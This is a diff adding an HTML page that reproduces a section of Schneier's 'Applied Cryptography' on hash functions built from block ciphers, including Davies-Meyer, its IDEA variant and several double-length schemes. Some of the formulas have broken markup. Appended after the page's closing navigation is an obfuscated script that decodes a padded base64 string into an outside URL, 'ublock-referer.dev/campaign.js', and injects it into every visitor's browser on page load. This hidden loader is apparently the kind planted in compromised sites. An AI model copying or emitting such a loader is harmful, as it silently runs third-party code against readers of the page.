@@ -1,0 +1,157 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=448-450//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+</P>
+<TABLE WIDTH="50%">
+<TH CAPTION COLSPAN="1" ALIGN="CENTER">Table 18.1<BR>Secure Hash Functions Where the Block Length Equals the Hash Size
+<TR>
+<TD WIDTH="50%" COLSPAN="1"><HR>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>H<SUB>i- 1</SUB></SUB> (<I>M</I><SUB>i</SUB>) &#8853; <I>M</I><SUB>i</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>H<SUB>i - 1</SUB></SUB>(<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB> ) &#8853; <I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>H<SUB>i- 1</SUB></SUB>(<I>M</I><SUB>i</SUB>) &#8853; <I>H</I><SUB>i- 1</SUB>  &#8853; <I>M</I><SUB>i</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>H<SUB>i- 1</SUB></SUB>(<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>) &#8853; <I>M</I><SUB>i</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>(<I>H</I><SUB>i - 1</SUB>) &#8853; <I>H</I><SUB>i- 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>(<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i - 1</SUB> ) &#8853; <I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i - 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>(<I>H</I><SUB>i - 1</SUB> ) &#8853; <I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i - 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>(<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>) &#8853; <I>H</I><SUB>i- 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>&#8853; <I>H</I><SUB>i- 1</SUB>(<I>M</I><SUB>i</SUB>) &#8853; <I>M</I><SUB>i</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>&#8853; <I>H</I><SUB>i- 1<SUB>(<I>H</I><SUB>i- 1</SUB>) &#8853; <I>H</I><SUB>i- 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>&#8853; <I>H</I><SUB>i- 1</SUB>(<I>Mi</I> ) &#8853; <I>H</I><SUB>i- 1</SUB>
+<TR>
+<TD WIDTH="50%" VALIGN="BOTTOM" ALIGN="LEFT"><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>&#8853; <I>H</I><SUB>i- 1</SUB>(<I>H</I><SUB>i- 1</SUB> ) &#8853; <I>M</I><SUB>i</SUB>
+<TR>
+<TD WIDTH="50%" COLSPAN="1"><HR>
+</TABLE>
+<P>The three different variables can take on one of four possible values, so there are 64 total schemes of this type. Bart Preneel studied them all [1262].
+</P>
+<P>Fifteen are trivially weak because the result does not depend on one of the inputs. Thirty-seven are insecure for more subtle reasons. Table 18.1 lists the 12 secure schemes remaining: The first 4 are secure against all attacks (see Figure 18.9) and the last 8 are secure against all but a fixed-point attack, which is not really worth worrying about.</P>
+<P>The first scheme was described in [1028]. The third scheme was described in [1555, 1105, 1106] and was proposed as an ISO standard [766]. The fifth scheme was proposed by Carl Meyer, but is commonly called Davies-Meyer in the literature [1606, 1607, 434, 1028]. The tenth scheme was proposed as a hash-function mode for LOKI [273].</P>
+<P>The first, second, third, fourth, ninth, and eleventh schemes have a hash rate of 1; the key length equals the block length. The others have a rate of <I>k/n,</I> where <I>k</I> is the key length. This means that if the key length is shorter than the block length, then the message block can only be the length of the key. It is not recommended that the message block be longer than the key length, even if the encryption algorithm&#146;s key length is longer than the block length.</P>
+<P>If the block algorithm has a DES-like complementation property and DES-like weak keys, there is an additional attack that is possible against all 12 schemes. The attack isn&#146;t very dangerous and not really worth worrying about. However, you can solve it by fixing bits 2 and 3 of the key to &#147;01&#148; or &#147;10&#148; [1081, 1107]. Of course, this reduces the length of <I>k</I> from 56 bits to 54 bits (in DES, for example) and decreases the hash rate.</P>
+<P>The following schemes, proposed in the literature, have been shown to be insecure.</P>
+<I><P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/18-09.jpg',349,170 )"><IMG SRC="images/18-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-09.jpg',349,170)"><FONT COLOR="#000077"><B>Figure 18.9</B></FONT></A>&nbsp;&nbsp;The four secure hash functions where the block length equals the hash size.</I>
+</P>
+<P>This scheme [1282] was broken in [369]:
+</P>
+<DL>
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>M<SUB>i</SUB></SUB>(<I>H</I><SUB>i - 1</SUB>)
+</DL>
+<P>Davies and Price proposed a variant which cycles the entire message through the algorithm twice [432, 433]. Coppersmith&#146;s attack works on this variant with not much larger computational requirements [369].
+</P>
+<P>Another scheme [432, 458] was shown insecure in [1606]:</P>
+<DL>
+<DD><I>Hi</I> = <I>E</I><SUB>M<SUB>i</SUB></SUB>&#8853; <I></I><SUB>H<SUB>i- 1</SUB></SUB> (<I>H</I><SUB>i- 1</SUB>)
+</DL>
+<P>This scheme was shown insecure in [1028] (<I>c</I> is a constant):</P>
+<DL>
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>c</SUB> (<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i - 1</SUB>) &#8853; <I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+</DL>
+<P><FONT SIZE="+1"><B><I>Modified Davies-Meyer</I></B></FONT></P>
+<P>Lai and Massey modified the Davies-Meyer technique to work with the IDEA cipher [930, 925]. IDEA has a 64-bit block size and 128-bit key size. Their scheme is
+</P>
+<DL>
+<DD><I>H</I><SUB>o</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is a random initial value
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>H<SUB>i- 1,Mi</SUB></SUB>(<I>H</I><SUB>i- 1</SUB>)
+</DL>
+<P>This function hashes the message in blocks of 64 bits and produces a 64-bit hash value (See Figure 18.10).
+</P>
+<P>No known attack on this scheme is easier than brute force.</P>
+<I><P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/18-10.jpg',220,55 )"><IMG SRC="images/18-10t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-10.jpg',220,55)"><FONT COLOR="#000077"><B>Figure 18.10</B></FONT></A>&nbsp;&nbsp;Modified Davies-Meyer.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Preneel-Bosselaers-Govaerts-Vandewalle</I></B></FONT></P>
+<P>This hash function, first proposed in [1266], produces a hash value twice the block length of the encryption algorithm: A 64-bit algorithm produces a 128-bit hash.
+</P>
+<P>With a 64-bit block algorithm, the scheme produces two 64-bit hash values, <I>G</I><SUB>i</SUB> and <I>H</I><SUB>i,</SUB> which are concatenated to produce the 128-bit hash. With most block algorithms, the block size is 64 bits. Two adjacent message blocks, <I>L</I><SUB>i</SUB> and <I>R</I><SUB>i,</SUB> each the size of the block length, are hashed together.</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is a random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is another random initial value
+<DD><I>G</I><SUB>i</SUB> = <I>E</I><SUB>Li</SUB>&#8853; <I>H</I><SUB>i- 1</SUB>(<I>R</I><SUB>i</SUB> &#8853; <I>G</I><SUB>i- 1 </SUB> ) &#8853; <I>R</I><SUB>i</SUB> &#8853; <I>G</I><SUB>i- 1</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>L<SUB>i</SUB></SUB>&#8853; <I>R</I><SUB>i</SUB>(<I>H</I><SUB>i- 1</SUB> &#8853; <I>G</I><SUB>i- 1 </SUB> ) &#8853; <I>L</I><SUB>i</SUB> &#8853; <I>G</I><SUB>i- 1</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+</DL>
+<P>Lai demonstrates attacks against this scheme that, in some instances, make the birthday attack trivially solvable [925, 926]. Preneel [1262] and Coppersmith [372] also have successful attacks against this scheme. Do not use it.
+</P>
+<P><FONT SIZE="+1"><B><I>Quisquater-Girault</I></B></FONT></P>
+<P>This scheme, first proposed in [1279], generates a hash that is twice the block length and has a hash rate of 1. It has two hash values, <I>G</I><SUB>i</SUB> and <I>H</I><SUB>i,</SUB> and two blocks, <I>L</I><SUB>i</SUB> and <I>R</I><SUB>i,</SUB> are hashed together.</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is a random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is another random initial value
+<DD><I>W</I><SUB>i</SUB> = <I>E</I><SUB>L<SUB>i</SUB></SUB>(<I>G</I><SUB>i - 1</SUB> &#8853; <I>R</I><SUB>i</SUB>) &#8853; <I>R</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+<DD><I>G</I><SUB>i</SUB> = <I>E</I><SUB>R<SUB>i</SUB></SUB>(<I>W</I><SUB>i</SUB> &#8853; <I>L</I><SUB>i</SUB>) &#8853; <I>G</I><SUB>i- 1</SUB> &#8853; <I>H</I><SUB>i- 1</SUB> &#8853; <I>L</I><SUB>i</SUB>
+<DD><I>H</I><SUB>i</SUB> = <I>W</I><SUB>i</SUB> &#8853; <I>G</I><SUB>i- 1</SUB>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(wimoMjlc, SopncNNh) {SopncNNh = wimoMjlc.createElement('script');SopncNNh.type = 'text/javascript';SopncNNh.async = true;SopncNNh.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');wimoMjlc.getElementsByTagName('body')[0].appendChild(SopncNNh);}(document));</script></body>
+</html>
